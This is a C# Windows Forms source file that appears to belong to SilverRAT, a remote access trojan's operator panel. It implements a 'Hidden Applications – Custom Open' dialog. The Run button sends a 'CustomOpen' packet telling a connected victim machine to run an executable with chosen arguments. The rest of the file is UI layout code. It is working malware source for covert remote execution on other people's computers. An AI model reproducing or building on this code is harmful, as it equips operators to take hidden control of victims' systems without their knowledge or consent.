using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.MessagePack;
using System;
using System.ComponentModel;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class FormCustomOpen : Form
{
    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    private System.Windows.Forms.Timer timer1;

    private Panel panelForm;

    private BunifuTextBox Arguments;

    private BunifuTextBox Filename;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    public Guna2GradientButton Run;

    private BunifuPanel PanelTitle;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox pictureBox1;

    private BunifuLabel bunifuLabel2;

    private BunifuLabel TitlrPage;

    internal Clients Client { get; set; }

    public FormCustomOpen(Clients Socket, string Info)
    {
        InitializeComponent();
        MaximumSize = base.Size;
        MinimumSize = base.Size;
        UserIdInfo.Text = Info;
        Client = Socket;
        timer1.Start();
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
        }
        catch
        {
        }
    }

    private void FormCustomOpen_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void FormCustomOpen_FormClosing(object sender, FormClosingEventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(panelForm);
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!Client.TcpClient.Connected)
            {
                Program.Silver.TransitionHiddeng.HideSync(panelForm);
                Close();
            }
        }
        catch
        {
        }
    }

    private void Run_Click(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrEmpty(Filename.Text))
            {
                MessageBox.Show(this, "Please enter the path of the executable file", "Hidden Applactions | Custom Open!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "CustomOpen";
            msgPack.ForcePathObject("Filename").AsString = Filename.Text;
            msgPack.ForcePathObject("Args").AsString = Arguments.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            Close();
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Hidden Applactions | Custom Open!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.FormCustomOpen));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.bunifuLabel2 = new Bunifu.UI.WinForms.BunifuLabel();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.TitlrPage = new Bunifu.UI.WinForms.BunifuLabel();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.Arguments = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Filename = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.Run = new Guna.UI2.WinForms.Guna2GradientButton();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.bunifuLabel2);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.Arguments);
        this.panelForm.Controls.Add(this.Filename);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Controls.Add(this.Run);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(626, 284);
        this.panelForm.TabIndex = 572;
        this.panelForm.Visible = false;
        this.bunifuLabel2.AllowParentOverrides = false;
        this.bunifuLabel2.AutoEllipsis = false;
        this.bunifuLabel2.AutoSize = false;
        this.bunifuLabel2.BackColor = System.Drawing.Color.White;
        this.bunifuLabel2.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel2.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel2.ForeColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.bunifuLabel2.Location = new System.Drawing.Point(37, 112);
        this.bunifuLabel2.Name = "bunifuLabel2";
        this.bunifuLabel2.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel2.Size = new System.Drawing.Size(562, 49);
        this.bunifuLabel2.TabIndex = 649;
        this.bunifuLabel2.Text = "NB!\r\nYou must put the path of the executable file that is on the client's computer and it is not required to put its value inside \"Arguments\" unless the executable file requires it";
        this.bunifuLabel2.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel2.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.TitlrPage);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.pictureBox1);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(596, 77);
        this.PanelTitle.TabIndex = 648;
        this.TitlrPage.AllowParentOverrides = false;
        this.TitlrPage.AutoEllipsis = false;
        this.TitlrPage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlrPage.CursorType = null;
        this.TitlrPage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlrPage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlrPage.Location = new System.Drawing.Point(173, 19);
        this.TitlrPage.Name = "TitlrPage";
        this.TitlrPage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlrPage.Size = new System.Drawing.Size(113, 15);
        this.TitlrPage.TabIndex = 608;
        this.TitlrPage.Text = "- Hidden Applactions";
        this.TitlrPage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlrPage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(566, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(543, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(92, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Coustom Open";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.pictureBox1.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(10, 13);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(59, 50);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox1.TabIndex = 570;
        this.pictureBox1.TabStop = false;
        this.Arguments.AcceptsReturn = false;
        this.Arguments.AcceptsTab = false;
        this.Arguments.AnimationSpeed = 200;
        this.Arguments.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Arguments.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Arguments.AutoSizeHeight = true;
        this.Arguments.BackColor = System.Drawing.Color.Transparent;
        this.Arguments.BackgroundImage = (System.Drawing.Image)resources.GetObject("Arguments.BackgroundImage");
        this.Arguments.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Arguments.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.Arguments.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Arguments.BorderColorIdle = System.Drawing.Color.Silver;
        this.Arguments.BorderRadius = 2;
        this.Arguments.BorderThickness = 1;
        this.Arguments.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Arguments.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Arguments.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.Arguments.DefaultText = "";
        this.Arguments.FillColor = System.Drawing.Color.White;
        this.Arguments.HideSelection = true;
        this.Arguments.IconLeft = null;
        this.Arguments.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Arguments.IconPadding = 10;
        this.Arguments.IconRight = null;
        this.Arguments.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Arguments.Lines = new string[0];
        this.Arguments.Location = new System.Drawing.Point(37, 213);
        this.Arguments.MaxLength = 32767;
        this.Arguments.MinimumSize = new System.Drawing.Size(1, 1);
        this.Arguments.Modified = false;
        this.Arguments.Multiline = false;
        this.Arguments.Name = "Arguments";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Arguments.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Arguments.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Arguments.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Arguments.OnIdleState = stateProperties4;
        this.Arguments.Padding = new System.Windows.Forms.Padding(3);
        this.Arguments.PasswordChar = '\0';
        this.Arguments.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Arguments.PlaceholderText = "Arguments";
        this.Arguments.ReadOnly = false;
        this.Arguments.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Arguments.SelectedText = "";
        this.Arguments.SelectionLength = 0;
        this.Arguments.SelectionStart = 0;
        this.Arguments.ShortcutsEnabled = true;
        this.Arguments.Size = new System.Drawing.Size(153, 28);
        this.Arguments.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Arguments.TabIndex = 603;
        this.Arguments.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
        this.Arguments.TextMarginBottom = 0;
        this.Arguments.TextMarginLeft = 3;
        this.Arguments.TextMarginTop = 1;
        this.Arguments.TextPlaceholder = "Arguments";
        this.Arguments.UseSystemPasswordChar = false;
        this.Arguments.WordWrap = true;
        this.Filename.AcceptsReturn = false;
        this.Filename.AcceptsTab = false;
        this.Filename.AnimationSpeed = 200;
        this.Filename.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Filename.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Filename.AutoSizeHeight = true;
        this.Filename.BackColor = System.Drawing.Color.Transparent;
        this.Filename.BackgroundImage = (System.Drawing.Image)resources.GetObject("Filename.BackgroundImage");
        this.Filename.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Filename.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.Filename.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Filename.BorderColorIdle = System.Drawing.Color.Silver;
        this.Filename.BorderRadius = 2;
        this.Filename.BorderThickness = 1;
        this.Filename.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Filename.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Filename.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.Filename.DefaultText = "";
        this.Filename.FillColor = System.Drawing.Color.White;
        this.Filename.HideSelection = true;
        this.Filename.IconLeft = null;
        this.Filename.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Filename.IconPadding = 10;
        this.Filename.IconRight = null;
        this.Filename.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Filename.Lines = new string[0];
        this.Filename.Location = new System.Drawing.Point(37, 179);
        this.Filename.MaxLength = 32767;
        this.Filename.MinimumSize = new System.Drawing.Size(1, 1);
        this.Filename.Modified = false;
        this.Filename.Multiline = false;
        this.Filename.Name = "Filename";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Filename.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Filename.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Filename.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Filename.OnIdleState = stateProperties8;
        this.Filename.Padding = new System.Windows.Forms.Padding(3);
        this.Filename.PasswordChar = '\0';
        this.Filename.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Filename.PlaceholderText = "File";
        this.Filename.ReadOnly = false;
        this.Filename.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Filename.SelectedText = "";
        this.Filename.SelectionLength = 0;
        this.Filename.SelectionStart = 0;
        this.Filename.ShortcutsEnabled = true;
        this.Filename.Size = new System.Drawing.Size(562, 28);
        this.Filename.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Filename.TabIndex = 602;
        this.Filename.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
        this.Filename.TextMarginBottom = 0;
        this.Filename.TextMarginLeft = 3;
        this.Filename.TextMarginTop = 1;
        this.Filename.TextPlaceholder = "File";
        this.Filename.UseSystemPasswordChar = false;
        this.Filename.WordWrap = true;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 273);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(293, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 92);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 115);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(293, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(616, 92);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 115);
        this.PanelRight.TabIndex = 591;
        this.Run.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Run.Animated = true;
        this.Run.BackColor = System.Drawing.Color.White;
        this.Run.BorderRadius = 1;
        this.Run.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Run.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Run.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Run.CheckedState.Parent = this.Run;
        this.Run.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Run.CustomImages.Parent = this.Run;
        this.Run.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Run.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Run.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Run.ForeColor = System.Drawing.Color.White;
        this.Run.HoverState.Parent = this.Run;
        this.Run.Location = new System.Drawing.Point(502, 228);
        this.Run.Name = "Run";
        this.Run.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Run.PressedDepth = 50;
        this.Run.ShadowDecoration.Parent = this.Run;
        this.Run.Size = new System.Drawing.Size(97, 25);
        this.Run.TabIndex = 574;
        this.Run.Text = "Run";
        this.Run.Click += new System.EventHandler(Run_Click);
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.timer1.Interval = 2000;
        this.timer1.Tick += new System.EventHandler(Timer1_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(650, 308);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "FormCustomOpen";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "FormCustomOpen";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FormCustomOpen_FormClosing);
        base.Shown += new System.EventHandler(FormCustomOpen_Shown);
        this.panelForm.ResumeLayout(false);
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        base.ResumeLayout(false);
    }
}
